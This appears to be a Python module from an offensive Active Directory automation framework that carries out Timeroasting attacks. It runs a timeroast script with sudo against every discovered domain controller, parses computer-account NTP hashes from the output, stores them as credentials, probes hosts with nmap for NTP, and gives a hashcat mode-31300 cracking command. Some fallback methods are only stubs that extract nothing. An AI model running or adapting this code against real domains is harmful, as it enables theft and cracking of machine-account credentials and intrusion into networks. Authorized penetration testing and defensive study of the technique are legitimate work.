#!/usr/bin/env python3
"""
Timeroasting Module for AD-Automaton
Performs Timeroasting attacks against the Windows Time service NTP authentication.
"""

import os
import re
import logging
from typing import List, Dict, Any, Optional

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential
from executor import CommandExecutor
from logger import log_discovery, log_tool_execution, log_tool_result

class TimeroastingAttacker:
    """
    Handles Timeroasting attacks using custom scripts to abuse Windows Time service.
    Targets computer account password hashes via NTP authentication mechanism.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the Timeroasting attacker.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        
        # Feature flag
        self.enabled = config.get('features', {}).get('enable_timeroasting', True)
        
        # Timeroast script path (would need to be downloaded/installed separately)
        self.timeroast_script = "/opt/timeroast/timeroast.py"
    
    def run_timeroasting(self) -> List[Credential]:
        """
        Main method to run Timeroasting attacks.
        
        Returns:
            List of computer account NTP hashes
        """
        if not self.enabled:
            self.logger.info("Timeroasting is disabled in configuration")
            return []
        
        self.logger.info("Starting Timeroasting attacks")
        
        # Get Domain Controllers for targeting
        dcs = self.db_manager.get_dcs()
        
        if not dcs:
            self.logger.warning("No Domain Controllers found for Timeroasting")
            return []
        
        discovered_hashes = []
        
        # Try Timeroasting against each DC
        for dc in dcs:
            try:
                hashes = self._perform_timeroasting(dc.ip_address)
                discovered_hashes.extend(hashes)
                
            except Exception as e:
                self.logger.error(f"Timeroasting failed against {dc.ip_address}: {e}")
                continue
        
        # Store discovered hashes
        if discovered_hashes:
            self._store_hashes(discovered_hashes)
        
        log_discovery("Timeroast hashes", len(discovered_hashes))
        
        return discovered_hashes
    
    def _perform_timeroasting(self, dc_ip: str) -> List[Credential]:
        """
        Perform Timeroasting attack against a specific DC.
        
        Args:
            dc_ip: Domain Controller IP address
            
        Returns:
            List of extracted computer account hashes
        """
        self.logger.info(f"Attempting Timeroasting against DC: {dc_ip}")
        
        hashes = []
        
        # Method 1: Use timeroast.py script if available
        if os.path.exists(self.timeroast_script):
            hashes.extend(self._timeroast_with_script(dc_ip))
        else:
            # Method 2: Use manual NTP query approach
            hashes.extend(self._timeroast_manual_approach(dc_ip))
        
        return hashes
    
    def _timeroast_with_script(self, dc_ip: str) -> List[Credential]:
        """
        Use timeroast.py script for the attack.
        
        Args:
            dc_ip: Domain Controller IP address
            
        Returns:
            List of computer account credentials
        """
        try:
            # Run timeroast.py script
            command = f"sudo python3 {self.timeroast_script} {dc_ip}"
            
            log_tool_execution("timeroast.py", command)
            result = self.executor.execute(command, timeout=60)
            
            log_tool_result("timeroast.py", result.exit_code, 
                          len(result.stdout.splitlines()) if result.stdout else 0)
            
            if result.exit_code == 0:
                # Parse timeroast output for computer account hash
                hashes = self._parse_timeroast_output(result.stdout, dc_ip)
                
                if hashes:
                    self.logger.info(f"Successfully extracted computer account hash from {dc_ip}")
                    return hashes
                else:
                    self.logger.info(f"No computer account hash extracted from {dc_ip}")
            else:
                self.logger.warning(f"timeroast.py failed against {dc_ip}: {result.stderr}")
            
        except Exception as e:
            self.logger.error(f"timeroast.py execution failed: {e}")
        
        return []
    
    def _timeroast_manual_approach(self, dc_ip: str) -> List[Credential]:
        """
        Manual approach using custom NTP queries.
        
        Args:
            dc_ip: Domain Controller IP address
            
        Returns:
            List of computer account credentials
        """
        self.logger.info(f"Using manual Timeroasting approach against {dc_ip}")
        
        try:
            # Create a basic NTP request that should trigger authentication
            # This is a simplified approach - real implementation would need
            # proper NTP packet crafting
            
            # Method 1: Try w32tm command if available (Windows environment)
            if self._is_windows_environment():
                return self._timeroast_w32tm(dc_ip)
            
            # Method 2: Use ntpdate with authentication
            return self._timeroast_ntpdate(dc_ip)
            
        except Exception as e:
            self.logger.error(f"Manual Timeroasting failed: {e}")
        
        return []
    
    def _timeroast_w32tm(self, dc_ip: str) -> List[Credential]:
        """
        Use w32tm command for Timeroasting (Windows environment).
        
        Args:
            dc_ip: Domain Controller IP address
            
        Returns:
            List of credentials
        """
        try:
            # Try to trigger NTP authentication with w32tm
            command = f"w32tm /stripchart /computer:{dc_ip} /samples:1"
            
            log_tool_execution("w32tm", command)
            result = self.executor.execute(command, timeout=30)
            
            # This approach would require packet capture to get the hash
            # For now, just log the attempt
            self.logger.info(f"w32tm executed against {dc_ip} - packet capture would be needed")
            
        except Exception as e:
            self.logger.debug(f"w32tm approach failed: {e}")
        
        return []
    
    def _timeroast_ntpdate(self, dc_ip: str) -> List[Credential]:
        """
        Use ntpdate command for Timeroasting (Linux environment).
        
        Args:
            dc_ip: Domain Controller IP address
            
        Returns:
            List of credentials
        """
        try:
            # Try ntpdate with debug mode
            command = f"ntpdate -d {dc_ip}"
            
            log_tool_execution("ntpdate", command)
            result = self.executor.execute(command, timeout=30)
            
            # Look for NTP authentication in the debug output
            if "authentication" in result.stdout.lower():
                self.logger.info(f"NTP authentication detected on {dc_ip}")
                # Would need packet capture to extract actual hash
            
        except Exception as e:
            self.logger.debug(f"ntpdate approach failed: {e}")
        
        return []
    
    def _parse_timeroast_output(self, output: str, dc_ip: str) -> List[Credential]:
        """
        Parse timeroast script output for computer account hashes.
        
        Args:
            output: Raw timeroast output
            dc_ip: DC IP address for context
            
        Returns:
            List of computer account credentials
        """
        credentials = []
        
        # Look for hash patterns in the output
        # NTP hashes are typically MD5-based
        hash_patterns = [
            r'([a-fA-F0-9]{32})',  # MD5 hash
            r'NTP.*?([a-fA-F0-9]{32})',  # NTP-specific hash
            r'Computer.*?([a-fA-F0-9]{32})',  # Computer account hash
        ]
        
        for pattern in hash_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            
            for match in matches:
                # Try to extract computer account name from context
                computer_name = self._extract_computer_name(output, dc_ip)
                
                credential = Credential(
                    username=computer_name,
                    hash_value=match,
                    hash_type="NTP",
                    source_tool="timeroast"
                )
                credentials.append(credential)
        
        return credentials
    
    def _extract_computer_name(self, output: str, dc_ip: str) -> str:
        """
        Extract computer account name from output or derive from DC IP.
        
        Args:
            output: Timeroast output
            dc_ip: DC IP address
            
        Returns:
            Computer account name
        """
        # Try to find computer name in output
        computer_patterns = [
            r'Computer:\s*(\S+)',
            r'Account:\s*(\S+\$)',
            r'Target:\s*(\S+)',
        ]
        
        for pattern in computer_patterns:
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                return match.group(1)
        
        # Fallback: try to resolve hostname from IP
        try:
            import socket
            hostname = socket.gethostbyaddr(dc_ip)[0]
            if hostname:
                # Extract computer name and add $ for machine account
                computer_name = hostname.split('.')[0].upper() + '$'
                return computer_name
        except Exception:
            pass
        
        # Last resort: use IP-based name
        return f"DC_{dc_ip.replace('.', '_')}$"
    
    def _is_windows_environment(self) -> bool:
        """Check if running in Windows environment."""
        return os.name == 'nt'
    
    def _store_hashes(self, hashes: List[Credential]) -> None:
        """
        Store discovered NTP hashes in the database.
        
        Args:
            hashes: List of NTP hash credentials
        """
        stored_count = 0
        
        for hash_credential in hashes:
            # Add additional metadata
            hash_credential.source_tool = "timeroast"
            hash_credential.hash_type = "NTP"
            
            if self.db_manager.add_credential(hash_credential):
                stored_count += 1
                self.logger.info(f"Stored Timeroast hash for computer: {hash_credential.username}")
        
        self.logger.info(f"Stored {stored_count} Timeroast hashes in database")
    
    def check_ntp_service(self) -> List[Dict[str, Any]]:
        """
        Check which hosts are running NTP service (potential Timeroasting targets).
        
        Returns:
            List of hosts with NTP service information
        """
        self.logger.info("Checking for NTP services (Timeroasting targets)")
        
        # NTP typically runs on port 123/UDP
        ntp_hosts = []
        
        # Get all hosts and check for NTP
        hosts = self.db_manager.get_hosts()
        
        for host in hosts:
            if self._check_ntp_on_host(host.ip_address):
                ntp_info = {
                    'ip': host.ip_address,
                    'hostname': host.hostname,
                    'is_dc': host.is_dc,
                    'ntp_version': self._get_ntp_version(host.ip_address)
                }
                ntp_hosts.append(ntp_info)
        
        self.logger.info(f"Found {len(ntp_hosts)} hosts with NTP service")
        return ntp_hosts
    
    def _check_ntp_on_host(self, ip_address: str) -> bool:
        """
        Check if NTP service is running on a host.
        
        Args:
            ip_address: Host IP address
            
        Returns:
            True if NTP service is detected
        """
        try:
            # Try nmap NTP script
            command = f"nmap -sU -p 123 --script ntp-info {ip_address}"
            result = self.executor.execute(command, timeout=30)
            
            if result.exit_code == 0 and 'ntp-info' in result.stdout:
                return True
            
            # Try direct NTP query
            command_ntpq = f"ntpq -p {ip_address}"
            result_ntpq = self.executor.execute(command_ntpq, timeout=15)
            
            if result_ntpq.exit_code == 0:
                return True
            
        except Exception as e:
            self.logger.debug(f"NTP check failed for {ip_address}: {e}")
        
        return False
    
    def _get_ntp_version(self, ip_address: str) -> Optional[str]:
        """
        Get NTP version information from a host.
        
        Args:
            ip_address: Host IP address
            
        Returns:
            NTP version string or None
        """
        try:
            command = f"nmap -sU -p 123 --script ntp-info {ip_address}"
            result = self.executor.execute(command, timeout=30)
            
            if result.exit_code == 0:
                # Parse version from nmap output
                version_match = re.search(r'version:\s*([^\n]+)', result.stdout)
                if version_match:
                    return version_match.group(1).strip()
            
        except Exception as e:
            self.logger.debug(f"NTP version check failed for {ip_address}: {e}")
        
        return None
    
    def crack_hashes_info(self) -> Dict[str, str]:
        """
        Provide information about cracking the discovered NTP hashes.
        
        Returns:
            Dictionary with cracking information
        """
        info = {
            'tool': 'Hashcat',
            'mode': '31300',
            'command_template': 'hashcat -m 31300 hashes.txt wordlist.txt',
            'description': 'Microsoft Windows Time Service NTP authentication',
            'notes': 'Computer account passwords are typically long and random but may be weak in legacy environments'
        }
        
        return info

def run_timeroasting(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[Credential]:
    """
    Main entry point for Timeroasting attacks.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of discovered NTP hashes
    """
    attacker = TimeroastingAttacker(db_manager, config)
    return attacker.run_timeroasting()

def check_ntp_services(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Check for NTP services on discovered hosts.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of hosts with NTP service information
    """
    attacker = TimeroastingAttacker(db_manager, config)
    return attacker.check_ntp_service()

def get_cracking_info() -> Dict[str, str]:
    """
    Get information about cracking Timeroast hashes.
    
    Returns:
        Dictionary with cracking information
    """
    attacker = TimeroastingAttacker(None, {})
    return attacker.crack_hashes_info() 